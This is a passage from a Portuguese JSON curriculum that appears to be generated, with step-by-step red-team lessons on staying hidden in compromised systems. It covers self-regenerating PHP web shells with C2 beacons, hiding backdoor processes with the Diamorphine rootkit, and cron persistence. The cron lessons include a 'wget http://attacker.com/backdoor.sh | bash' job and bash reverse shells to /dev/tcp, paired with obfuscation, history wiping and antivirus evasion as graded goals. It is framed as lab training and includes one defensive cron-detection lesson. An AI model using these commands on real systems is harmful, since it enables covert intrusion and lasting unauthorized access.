                                    "Adicione autenticação mútua (tokens) para evitar reimplantações não autorizadas.",
                                    "Teste ciclo: delete shell, aguarde beacon falho, confirme regeneração.",
                                    "Otimize sleeper times para balancear stealth e responsividade."
                                  ],
                                  "verification": "Delete shell manualmente, execute comando C2 para regenerar, acesse URL restaurada com sucesso.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "C2 framework configurado",
                                    "Ferramentas de proxy (Burp) para testar comunicação",
                                    "Ngrok para exposição segura"
                                  ],
                                  "tips": "Use HTTPS para C2 comms; randomize user-agents e delays para evasão.",
                                  "learningObjective": "Estabelecer persistência dinâmica via comunicação externa.",
                                  "commonMistakes": [
                                    "Beacons muito frequentes detectáveis",
                                    "Falta de handling de falhas de rede",
                                    "Tokens hardcoded"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Implantação, Teste Completo e Limpeza",
                                  "subSteps": [
                                    "Upload shell via vulnerabilidade simulada no diretório web.",
                                    "Monitore ciclo de vida por 2-3 iterações (delete/regenerate).",
                                    "Execute comandos avançados (netstat, persistence checks).",
                                    "Simule detecção (scan com antivirus) e confirme evasão.",
                                    "Limpe ambiente: delete arquivos, reset VM, documente lições."
                                  ],
                                  "verification": "Persistência mantida por múltiplos ciclos sem intervenção manual; logs mostram sucesso.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Browser/Postman para testes",
                                    "Ferramentas de scan (ClamAV)",
                                    "Scripts de cleanup"
                                  ],
                                  "tips": "Grave sessão com screen recording para revisão; sempre priorize cleanup.",
                                  "learningObjective": "Validar implantação end-to-end em cenário realista.",
                                  "commonMistakes": [
                                    "Esquecer cleanup expondo lab",
                                    "Testes incompletos sem ciclos múltiplos",
                                    "Ignorar logs de erro"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de CTF (Capture The Flag), comprometa um servidor web via LFI/RFI, implante o shell PHP em /uploads/, configure auto-deleção após 12h e regeneração via Covenant C2 a cada checagem falha, mantendo acesso para escalação de privilégios durante 48h simuladas.",
                              "finalVerifications": [
                                "Shell acessível e executa comandos via browser/C2 sem erros.",
                                "Auto-deleção ocorre no tempo programado.",
                                "Regeneração automática via C2 restaura funcionalidade em <5min.",
                                "Persistência sobrevive a 3 ciclos delete/regenerate.",
                                "Sem logs óbvios ou artifacts detectáveis por scans básicos.",
                                "Comunicação C2 criptografada e stealth."
                              ],
                              "assessmentCriteria": [
                                "Código shell completo, ofuscado e funcional (100% comandos testados).",
                                "Mecanismos de persistência operam autonomamente sem intervenção.",
                                "Evasão de detecção: sobrevive a restarts de server e scans iniciais.",
                                "Eficiência: tempos de resposta <10s, overhead CPU <5%.",
                                "Documentação: relatório com código fonte, logs e lições aprendidas.",
                                "Segurança do lab: zero vazamento para redes externas."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web (PHP/ASP scripting e server-side logic).",
                                "Redes e Comunicação Segura (C2 protocols, HTTPS, proxies).",
                                "Desenvolvimento de Software Seguro (ofuscação, error handling).",
                                "Análise de Malware (técnicas de persistência e evasão).",
                                "Ética em Cibersegurança (uso exclusivo em ethical hacking)."
                              ],
                              "realWorldApplication": "Em exercícios de Red Team e Purple Teaming, web shells persistentes permitem acesso prolongado a infraestruturas críticas simuladas, facilitando simulações de ataques avançados (APT) para treinamento de Blue Teams em detecção e resposta a ameaças persistentes."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.3.2",
                            "name": "Integração de Rootkits para Hook de Processos",
                            "description": "Usar ferramentas como Diamorphine ou Reptile para hook de syscalls, escondendo processos backdoor de ferramentas como ps ou netstat.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste Seguro",
                                  "subSteps": [
                                    "Crie uma máquina virtual Linux (ex: Ubuntu 20.04) com kernel headers instalados via apt install linux-headers-$(uname -r).",
                                    "Habilite módulos kernel dinâmicos (LKMs) configurando /etc/modprobe.d/disable-rootkit.conf se necessário.",
                                    "Instale ferramentas de depuração como gdb, strace e compile o kernel com CONFIG_MODULE_SIG=n para testes.",
                                    "Configure rede isolada e firewall para conter qualquer backdoor simulado.",
                                    "Crie um usuário root e teste privilégios com sudo."
                                  ],
                                  "verification": "Execute uname -r e lsmod para confirmar ambiente kernel pronto; verifique isolamento de rede com ping externo bloqueado.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "VMware/VirtualBox, ISO Ubuntu, kernel headers, gdb, strace",
                                  "tips": "Use snapshot da VM antes de carregar módulos para fácil rollback.",
                                  "learningObjective": "Preparar um ambiente isolado e seguro para experimentação com rootkits sem riscos ao host.",
                                  "commonMistakes": "Esquecer de desabilitar module signing, levando a falhas de carregamento; não isolar rede, expondo backdoors."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar e Carregar Rootkit Base (Diamorphine ou Reptile)",
                                  "subSteps": [
                                    "Baixe código fonte do Diamorphine do GitHub (ou similar para Reptile) em /tmp/rootkit.",
                                    "Compile o módulo com make, resolvendo dependências como gcc e make.",
                                    "Inspecione o código fonte para entender hooks em syscalls como getdents64.",
                                    "Carregue o módulo com insmod diamorphine.ko.",
                                    "Verifique logs do kernel com dmesg | tail para confirmação de carga."
                                  ],
                                  "verification": "Execute lsmod | grep diamorphine para ver módulo ativo; dmesg mostra 'Diamorphine LKM loaded'.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Código fonte Diamorphine/Reptile, gcc, make, insmod",
                                  "tips": "Compile em modo debug com -DDEBUG para logs extras.",
                                  "learningObjective": "Dominar compilação e carga de LKMs para rootkits user-mode hiders.",
                                  "commonMistakes": "Compilação em kernel incompatível; ignorar verificação de assinaturas de módulo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Hooks de Syscalls para Ocultação de Processos",
                                  "subSteps": [
                                    "Identifique syscalls alvo: getdents para ls/ps, sys_netstat para netstat.",
                                    "Modifique parâmetros do rootkit (ex: echo PID > /proc/hidepid para Diamorphine).",
                                    "Inicie um processo backdoor simulado (ex: nc -lvp 4444).",
                                    "Aplique hook configurando o módulo para esconder PID específico.",
                                    "Teste preliminar com ps aux | grep nc para ausência."
                                  ],
                                  "verification": "ps aux não lista o backdoor; netstat -anp não mostra porta 4444.",
                                  "estimatedTime": "25-40 minutos",
                                  "materials": "netcat (nc), ps, netstat, /proc filesystem",
                                  "tips": "Use strace ps aux para depurar se hook falha em syscall.",
                                  "learningObjective": "Implementar hooks específicos em syscalls para persistência stealth.",
                                  "commonMistakes": "Hookar syscall errado (ex: getdents em vez de getdents64); PID incorreto."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Ocultação Completa",
                                  "subSteps": [
                                    "Execute varreduras: ps, top, lsof, netstat, ss -tuln.",
                                    "Simule detecção com chkrootkit ou rkhunter.",
                                    "Monitore tráfego com tcpdump para confirmar backdoor ativo mas invisível.",
                                    "Teste estabilidade reiniciando processos e verificando hooks.",
                                    "Registre logs de falhas para análise."
                                  ],
                                  "verification": "Todas ferramentas de listagem não detectam backdoor; conexão externa ao backdoor funciona.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "chkrootkit, rkhunter, tcpdump, lsof, ss",
                                  "tips": "Combine com LD_PRELOAD tricks para testes avançados.",
                                  "learningObjective": "Validar efetividade de rootkits contra ferramentas comuns de detecção.",
                                  "commonMistakes": "Testar apenas ps, ignorando lsof ou ss; não monitorar kernel logs."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Análise, Remoção e Relatório de Lições",
                                  "subSteps": [
                                    "Descarregue módulo com rmmod diamorphine.",
                                    "Verifique limpeza com lsmod e dmesg.",
                                    "Analise impacto com journalctl e perfis de sistema.",
                                    "Documente sucessos/falhas em relatório.",
                                    "Restaure snapshot da VM."
                                  ],
                                  "verification": "Módulo removido, backdoor visível novamente, sistema limpo.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": "rmmod, journalctl, editor de texto",
                                  "tips": "Sempre documente hashes de módulos para auditoria.",
                                  "learningObjective": "Garantir remoção segura e extrair lições para detecção futura.",
                                  "commonMistakes": "Falhar em rmmod, deixando rootkit persistente; perda de snapshot."
                                }
                              ],
                              "practicalExample": "Em uma VM Ubuntu, compile Diamorphine, carregue-o, inicie nc -lvp 4444 como backdoor (PID 1234), configure hidepid=1234. Agora, ps aux e netstat não mostram o processo/porta, mas telnet localhost 4444 conecta, simulando persistência em pentest.",
                              "finalVerifications": [
                                "Processo backdoor invisível em ps, top, htop.",
                                "Portas/conexões ocultas em netstat, ss, lsof.",
                                "Ferramentas anti-rootkit (chkrootkit) não detectam.",
                                "Syscalls hooked confirmados via strace.",
                                "Persistência mantida após reboot de processos.",
                                "Remoção completa sem vestígios."
                              ],
                              "assessmentCriteria": [
                                "Compilação e carga de LKM sem erros.",
                                "Hooks aplicados corretamente a syscalls específicas.",
                                "Ocultação 100% efetiva contra 5+ ferramentas de listagem.",
                                "Ambiente isolado e rollback demonstrado.",
                                "Relatório detalhado com logs e lições.",
                                "Compreensão verbal de mecanismos de hook."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Kernel Linux (desenvolvimento LKMs).",
                                "Análise de Malware (detecção de rootkits).",
                                "Red Teaming e Purple Teaming (simulações ofensivas).",
                                "Forense Digital (logs kernel e syscalls).",
                                "Segurança de Sistemas Operacionais (hardening kernel)."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante jogos de guerra cibernética, integra rootkits para simular APTs persistentes, testando defesas Blue Team; essencial para treinar detecção de ameaças avançadas em ambientes corporativos ou governamentais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.5",
                    "name": "Persistência com Tarefas Agendadas e Serviços",
                    "description": "Implementação de persistência utilizando cron jobs, tarefas agendadas e serviços do SO.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.5.1",
                        "name": "Persistência com Cron Jobs em Linux/Unix",
                        "description": "Conceito que aborda a implementação de mecanismos de persistência no sistema operacional Linux/Unix utilizando cron jobs, que são tarefas agendadas executadas periodicamente para manter o acesso ao sistema comprometido.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.1.1",
                            "name": "Entender a sintaxe e funcionamento do crontab",
                            "description": "Aprender a estrutura do arquivo crontab, incluindo campos como minuto, hora, dia do mês, mês e dia da semana, e comandos para edição com crontab -e, listagem com crontab -l e remoção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Introdução ao Crontab e Acesso Inicial",
                                  "subSteps": [
                                    "Abra um terminal em um ambiente Linux/Unix.",
                                    "Execute 'man crontab' ou 'man 5 crontab' para ler a página de manual e entender o propósito básico.",
                                    "Liste o crontab atual do usuário com 'crontab -l' e observe a saída.",
                                    "Verifique se o serviço cron está rodando com 'systemctl status cron' ou 'service cron status'."
                                  ],
                                  "verification": "Comando 'crontab -l' executa sem erros e exibe o crontab atual (ou mensagem de vazio).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux/Unix",
                                    "Acesso root ou sudo se necessário",
                                    "Página man crontab"
                                  ],
                                  "tips": [
                                    "Sempre consulte 'man' para referências rápidas.",
                                    "Teste em VM para evitar impactos em produção."
                                  ],
                                  "learningObjective": "Compreender o que é crontab e como acessá-lo para gerenciamento de tarefas agendadas.",
                                  "commonMistakes": [
                                    "Confundir crontab com 'at' (tarefas únicas).",
                                    "Executar sem permissões, resultando em erros de acesso."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Sintaxe dos Campos Temporais",
                                  "subSteps": [
                                    "Memorize a estrutura: minuto (0-59), hora (0-23), dia do mês (1-31), mês (1-12), dia da semana (0-7), comando.",
                                    "Estude wildcards (* para todos), ranges (1-5), listas (1,3,5) e steps (/5 para cada 5 unidades).",
                                    "Escreva exemplos manuais: '* * * * * echo \"teste\"' (a cada minuto).",
                                    "Compare com calendário para validar: '0 2 * * 1 /script.sh' (terças às 2h).",
                                    "Pratique decodificando linhas existentes de exemplos online."
                                  ],
                                  "verification": "Desenhe ou liste corretamente os 6 campos e dê exemplos válidos para cada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Papel e caneta para diagramas",
                                    "Editor de texto",
                                    "Referência online de crontab.guru"
                                  ],
                                  "tips": [
                                    "Use crontab.guru para visualizar sintaxe graficamente.",
                                    "Lembre: dia da semana 0 e 7 são domingo."
                                  ],
                                  "learningObjective": "Dominar a estrutura exata dos 5 campos temporais e modificadores especiais.",
                                  "commonMistakes": [
                                    "Inverter ordem dos campos.",
                                    "Usar valores inválidos como 60 para minutos.",
                                    "Esquecer que meses usam 1-12, não nomes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar o Crontab com Comandos Essenciais",
                                  "subSteps": [
                                    "Edite o crontab com 'crontab -e' e adicione uma linha de teste simples.",
                                    "Salve e saia do editor (ex: :wq no vim).",
                                    "Liste novamente com 'crontab -l' para confirmar a adição.",
                                    "Remova uma entrada específica editando novamente ou use 'crontab -r' para limpar tudo.",
                                    "Explore 'crontab -i' para remoção interativa se disponível."
                                  ],
                                  "verification": "Adicionar, listar e remover entradas sem erros de sintaxe ou permissão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto padrão (nano/vim)",
                                    "Terminal com cron ativo"
                                  ],
                                  "tips": [
                                    "Configure EDITOR=nano para iniciantes.",
                                    "Faça backup com 'crontab -l > backup.txt' antes de editar."
                                  ],
                                  "learningObjective": "Executar com fluência os comandos -e, -l e -r para CRUD de jobs.",
                                  "commonMistakes": [
                                    "Não salvar o editor corretamente.",
                                    "Usar 'crontab -r' sem intenção de limpar tudo."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Funcionamento e Logs de Jobs",
                                  "subSteps": [
                                    "Adicione um job de teste: '*/2 * * * * echo \"$(date)\" >> /tmp/cron.log'.",
                                    "Aguarde execução e verifique o arquivo /tmp/cron.log.",
                                    "Inspecione logs do cron em /var/log/cron ou /var/log/syslog com 'grep CRON'.",
                                    "Corrija erros comuns como caminhos absolutos no comando.",
                                    "Remova o job de teste após validação."
                                  ],
                                  "verification": "Job executa conforme agendado e log confirma saída esperada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "/tmp/ diretório de escrita",
                                    "Permissões de log"
                                  ],
                                  "tips": [
                                    "Sempre use caminhos absolutos em comandos cron.",
                                    "Teste com intervalos curtos como */1 para feedback rápido."
                                  ],
                                  "learningObjective": "Diagnosticar e confirmar execução de jobs crontab via logs.",
                                  "commonMistakes": [
                                    "Caminhos relativos que falham no cron.",
                                    "Ignorar output para /dev/null sem verificação."
                                  ]
                                }
                              ],
                              "practicalExample": "Para simular persistência em ethical hacking, agende '*/5 * * * * /bin/bash -c \"wget -q -O- http://attacker.com/backdoor.sh | bash\"' para baixar e executar um script malicioso a cada 5 minutos, verificando logs em /var/log/syslog para confirmação de execução.",
                              "finalVerifications": [
                                "Explicar verbalmente ou por escrito os 6 campos da sintaxe crontab.",
                                "Criar e listar um job válido com range e wildcard.",
                                "Identificar e corrigir erro em uma linha crontab inválida.",
                                "Localizar logs de execução de um job de teste.",
                                "Diferenciar crontab de usuário vs. system-wide (/etc/crontab)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos os campos temporais (100% correto).",
                                "Execução bem-sucedida de crontab -e, -l, -r sem erros.",
                                "Validação correta de pelo menos 3 exemplos de sintaxe complexa.",
                                "Análise de logs demonstrando compreensão de falhas comuns.",
                                "Explicação clara de uso em persistência de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Shell Scripting: Integração de comandos em jobs cron.",
                                "Administração de Sistemas: Gerenciamento de serviços e automação.",
                                "Segurança Cibernética: Técnicas de persistência e detecção de backdoors.",
                                "Análise de Logs: Habilidades em syslog e troubleshooting."
                              ],
                              "realWorldApplication": "Em ethical hacking, cron jobs são usados para persistência de malware (ex: agendar reconexões C2); em administração, para backups automáticos, monitoramento de servidores e relatórios diários, garantindo tarefas recorrentes sem intervenção manual."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.1.2",
                            "name": "Criar um cron job para executar payload malicioso",
                            "description": "Implementar um cron job que execute um script ou binário de reverse shell a cada intervalo definido (ex: * * * * * /tmp/payload.sh), garantindo execução silenciosa e redirecionamento de saída para evitar logs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Payload Malicioso",
                                  "subSteps": [
                                    "Escreva um script de reverse shell simples usando bash, como 'bash -i >& /dev/tcp/ATACA_IP/4444 0>&1'",
                                    "Salve o script em um local oculto, ex: /tmp/payload.sh",
                                    "Torne o script executável com chmod +x /tmp/payload.sh",
                                    "Teste o script manualmente para garantir que estabelece conexão reversa",
                                    "Obfusque o script se possível, usando base64 ou variáveis para evitar detecção básica"
                                  ],
                                  "verification": "Execute o script manualmente e confirme que uma shell reversa é aberta no listener (nc -lvnp 4444)",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor de texto (nano/vi)",
                                    "Netcat (nc) para listener",
                                    "Máquina vítima Linux/Unix controlada em lab"
                                  ],
                                  "tips": "Use IPs controlados em ambiente isolado; evite domínios reais para testes éticos",
                                  "learningObjective": "Entender criação de payloads persistentes e reversos para simulações de ataque",
                                  "commonMistakes": [
                                    "Esquecer de tornar executável",
                                    "Usar IP público sem VPN/túnel",
                                    "Deixar script sem ofuscação básica"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Execução Silenciosa do Payload",
                                  "subSteps": [
                                    "Modifique o script para redirecionar stdout/stderr para /dev/null: '>/dev/null 2>&1'",
                                    "Adicione nohup para execução em background: 'nohup bash -i >& /dev/tcp/ATACA_IP/4444 0>&1 >/dev/null 2>&1 &'",
                                    "Teste a execução silenciosa verificando ausência de processos visíveis em ps aux",
                                    "Limpe histórico de comandos com history -c e unset HISTFILE",
                                    "Verifique se não há logs em /var/log/syslog ou auth.log relacionados"
                                  ],
                                  "verification": "Execute o payload modificado e confirme shell reversa sem entradas em logs (tail -f /var/log/syslog)",
                                  "estimatedTime": "8 minutos",
                                  "materials": [
                                    "Comandos Linux: nohup, tail, ps",
                                    "Listener netcat ativo"
                                  ],
                                  "tips": "Sempre teste em VM snapshot para reset fácil; use strings obfuscadas no script",
                                  "learningObjective": "Dominar técnicas de stealth para payloads em cenários red team",
                                  "commonMistakes": [
                                    "Não redirecionar outputs",
                                    "Deixar processos zombies visíveis",
                                    "Ignorar limpeza de histórico"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar e Adicionar o Cron Job",
                                  "subSteps": [
                                    "Abra crontab com 'crontab -e'",
                                    "Adicione linha para execução a cada minuto: '* * * * * /tmp/payload.sh'",
                                    "Salve e saia do editor",
                                    "Liste crontab com 'crontab -l' para confirmar adição",
                                    "Aguarde 1-2 minutos e verifique se payload executa periodicamente"
                                  ],
                                  "verification": "Execute 'crontab -l' e veja a entrada; monitore listener para shells a cada minuto",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Acesso root ou sudo para crontab usuário",
                                    "Editor crontab (nano/vi)"
                                  ],
                                  "tips": "Use @reboot para persistência pós-reboot; evite crontab root se possível para realismo",
                                  "learningObjective": "Aprender sintaxe e edição de crontab para tarefas agendadas maliciosas",
                                  "commonMistakes": [
                                    "Sintaxe errada no cron (use crontab.guru para validar)",
                                    "Esquecer de salvar crontab",
                                    "Usar intervalos muito frequentes que consomem CPU"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Persistência e Limpeza",
                                  "subSteps": [
                                    "Reinicie a máquina vítima e confirme execução pós-boot com listener",
                                    "Inspecione /var/spool/cron/crontabs/ para entradas ocultas",
                                    "Remova job com 'crontab -e' e delete payload para cleanup",
                                    "Verifique ausência de artefatos em logs e processos",
                                    "Documente o TTP (Technique, Tactic, Procedure) para relatório blue team"
                                  ],
                                  "verification": "Pós-reboot, shells reversas abrem automaticamente sem intervenção manual",
                                  "estimatedTime": "7 minutos",
                                  "materials": [
                                    "Acesso para reboot VM",
                                    "Ferramentas de log: journalctl, grep"
                                  ],
                                  "tips": "Em labs, use scripts de automação para múltiplos testes; sempre reporte findings",
                                  "learningObjective": "Avaliar eficácia de persistência e técnicas de evasão em ethical hacking",
                                  "commonMistakes": [
                                    "Não testar pós-reboot",
                                    "Deixar payloads órfãos",
                                    "Ignorar detecção por EDRs simulados"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Ubuntu lab isolada, crie /tmp/payload.sh com 'nohup bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 >/dev/null 2>&1 &'. Adicione '* * * * * /tmp/payload.sh' ao crontab do usuário 'victim'. Configure nc -lvnp 4444 na máquina atacante. A cada minuto, uma shell reversa abre silenciosamente, simulando persistência em pentest.",
                              "finalVerifications": [
                                "Cron job listado corretamente em 'crontab -l'",
                                "Payload executa a cada intervalo sem logs em /var/log/syslog ou cron",
                                "Shell reversa estabelecida periodicamente no listener",
                                "Persistência mantida após reboot da VM",
                                "Nenhum processo ou artefato visível em 'ps aux | grep payload'",
                                "Cleanup completo sem vestígios"
                              ],
                              "assessmentCriteria": [
                                "Execução silenciosa sem outputs em logs (100% stealth)",
                                "Persistência confirmada em múltiplos ciclos e reboot",
                                "Sintaxe cron precisa e intervalo funcional",
                                "Payload obfuscado e testado manualmente antes",
                                "Documentação de verificações e cleanup incluída",
                                "Uso ético em ambiente controlado/lab"
                              ],
                              "crossCurricularConnections": [
                                "Administração Linux: Gerenciamento de crontab e serviços",
                                "Scripting Bash: Criação de payloads automatizados",
                                "Redes: Conceitos de reverse shells e C2 communication",
                                "Segurança Defensiva: Detecção de cron jobs maliciosos via auditd",
                                "Programação: Automação com Python para simular ataques"
                              ],
                              "realWorldApplication": "Em operações red team e jogos de guerra cibernética, essa técnica permite manter acesso persistente em servidores Linux comprometidos durante pentests autorizados, simulando APTs reais como UNC2452 (SolarWinds), ajudando equipes blue a aprimorar detecções de tarefas agendadas anômalas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.1.3",
                            "name": "Verificar, testar e limpar cron jobs de persistência",
                            "description": "Usar comandos como crontab -l, grep em /var/log/cron e /etc/cron.d/* para identificar jobs suspeitos, testar execução com run-parts e remover com crontab -r ou edição manual.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Listar e Identificar Cron Jobs Suspeitos",
                                  "subSteps": [
                                    "Execute 'crontab -l' para listar jobs do usuário atual.",
                                    "Use 'sudo crontab -l' e verifique /etc/crontab para jobs de root e sistema.",
                                    "Liste diretórios com 'ls /etc/cron.d/*', '/etc/cron.hourly/*', '/etc/cron.daily/*', '/etc/cron.weekly/*' e '/etc/cron.monthly/*'.",
                                    "Aplique 'grep -r \"suspicious_pattern\" /etc/cron.*' para buscar padrões maliciosos como downloads ou execuções remotas.",
                                    "Documente jobs com caminhos incomuns (/tmp, /var/tmp) ou comandos obfuscados."
                                  ],
                                  "verification": "Lista completa de jobs gerada e jobs suspeitos anotados em um relatório.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal Linux/Unix com acesso root",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": [
                                    "Sempre use sudo para acesso completo; priorize jobs em /etc/cron.d para persistência de root."
                                  ],
                                  "learningObjective": "Localizar todos os possíveis cron jobs de persistência em sistemas Linux/Unix.",
                                  "commonMistakes": [
                                    "Esquecer diretórios como /etc/cron.hourly",
                                    "Não verificar crontabs de outros usuários com 'crontab -u user -l'",
                                    "Ignorar jobs condicionais (@reboot)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Logs de Execução de Cron Jobs",
                                  "subSteps": [
                                    "Execute 'grep CRON /var/log/syslog' ou 'grep CRON /var/log/cron' para logs de execução.",
                                    "Filtre por jobs suspeitos: 'grep \"/tmp/malware\" /var/log/cron'.",
                                    "Verifique timestamps recentes e frequência de execuções com 'tail -f /var/log/cron'.",
                                    "Correlacione com outros logs: 'journalctl -u cron' em sistemas com systemd.",
                                    "Anote IPs, comandos executados e erros indicativos de payloads maliciosos."
                                  ],
                                  "verification": "Relatório de logs com evidências de atividade suspeita gerado.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Acesso a logs (/var/log)",
                                    "Ferramentas como grep, tail e journalctl"
                                  ],
                                  "tips": [
                                    "Habilite loglevel de cron se necessário em /etc/rsyslog.conf para mais detalhes."
                                  ],
                                  "learningObjective": "Interpretar logs para confirmar atividade de cron jobs maliciosos.",
                                  "commonMistakes": [
                                    "Não usar sudo para logs protegidos",
                                    "Ignorar fusos horários nos timestamps",
                                    "Confundir logs de jobs legítimos com maliciosos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar Execução de Jobs Suspeitos",
                                  "subSteps": [
                                    "Isole o job suspeito em um ambiente controlado (VM ou chroot).",
                                    "Execute manualmente com 'run-parts /etc/cron.hourly/nome_do_job' para diretórios cron.",
                                    "Para crontab individual: extraia o comando e rode '/bin/sh -c \"comando_do_job\"'.",
                                    "Monitore com 'strace' ou 'ps aux' durante execução para observar comportamento.",
                                    "Verifique payloads: 'strings /caminho/do/script' e analise network com tcpdump."
                                  ],
                                  "verification": "Job testado sem impacto no sistema principal; comportamento malicioso confirmado ou refutado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VM isolada",
                                    "strace, tcpdump, strings"
                                  ],
                                  "tips": [
                                    "Nunca teste em produção; use sandbox para evitar execução real de malware."
                                  ],
                                  "learningObjective": "Simular execução segura para validar ameaça de persistência.",
                                  "commonMistakes": [
                                    "Executar diretamente em host de produção",
                                    "Não isolar network durante teste",
                                    "Ignorar dependências de ambiente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Limpar e Remover Cron Jobs de Persistência",
                                  "subSteps": [
                                    "Remova job do usuário com 'crontab -e' e delete linha, ou 'crontab -r'.",
                                    "Para sistema: 'rm /etc/cron.d/nome_suspeito' e confirme com 'ls'.",
                                    "Mate processos relacionados: 'pkill -f nome_do_script'; delete binários em /tmp.",
                                    "Reinicie cron: 'systemctl restart cron' e verifique logs pós-limpeza.",
                                    "Documente mudanças e configure monitoramento futuro com auditd."
                                  ],
                                  "verification": "Nova listagem de crontab vazia de suspeitos; logs limpos sem reexecuções.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Acesso root",
                                    "Backup de configs originais"
                                  ],
                                  "tips": [
                                    "Faça backup antes de editar: 'cp /etc/cron.d/* /backup/'."
                                  ],
                                  "learningObjective": "Eliminar persistência de forma segura e verificar eficácia.",
                                  "commonMistakes": [
                                    "Não reiniciar cron após remoção",
                                    "Esquecer de matar processos filhos",
                                    "Não documentar para relatórios forenses"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest de servidor web Linux comprometido, você executa 'sudo crontab -l' e encontra '* * * * * /tmp/backdoor.sh'. Grep em /var/log/cron mostra execuções horárias baixando C2. Testa com run-parts em VM, confirmando beacon, e remove com 'rm /tmp/backdoor.sh' e edição de crontab, reiniciando cron.",
                              "finalVerifications": [
                                "Lista todos cron jobs sem erros usando múltiplos comandos.",
                                "Identifica e documenta jobs suspeitos por padrões maliciosos.",
                                "Analisa logs e correlaciona com atividades recentes.",
                                "Testa job em ambiente isolado sem vazamentos.",
                                "Remove jobs e verifica ausência pós-limpeza.",
                                "Gera relatório completo com evidências."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 100% dos locais de cron jobs.",
                                "Segurança no teste: zero impacto em produção.",
                                "Análise de logs com filtros avançados e correlações.",
                                "Efetividade da limpeza: sem reexecuções em 24h simuladas.",
                                "Documentação clara e acionável para equipes.",
                                "Tempo total dentro de 1h para cenário médio."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Linux (gestão de serviços).",
                                "Análise Forense Digital (interpretação de logs).",
                                "Programação Shell Script (análise de payloads).",
                                "Redes e Monitoramento (detecção de C2 via tcpdump).",
                                "Resposta a Incidentes (IR playbooks)."
                              ],
                              "realWorldApplication": "Em operações de resposta a incidentes (IR) em data centers ou cloud Linux, red teams usam isso para simular remoção de backdoors deixados por APTs, prevenindo re-infestações em servidores críticos como web ou DB."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.5.2",
                        "name": "Persistência com Tarefas Agendadas no Windows",
                        "description": "Conceito focado na criação de tarefas persistentes no Windows Task Scheduler para executar payloads ao login, startup ou intervalos regulares, mantendo acesso pós-reboot.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.2.1",
                            "name": "Navegar e explorar o Task Scheduler",
                            "description": "Acessar o Task Scheduler via schtasks.exe ou GUI (taskschd.msc), listar tarefas com schtasks /query /fo LIST /v e entender triggers como At log on, At startup e Monthly.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Acessar o Task Scheduler via Interface Gráfica (GUI)",
                                  "subSteps": [
                                    "Pressione Windows + R para abrir a caixa Executar.",
                                    "Digite 'taskschd.msc' e pressione Enter.",
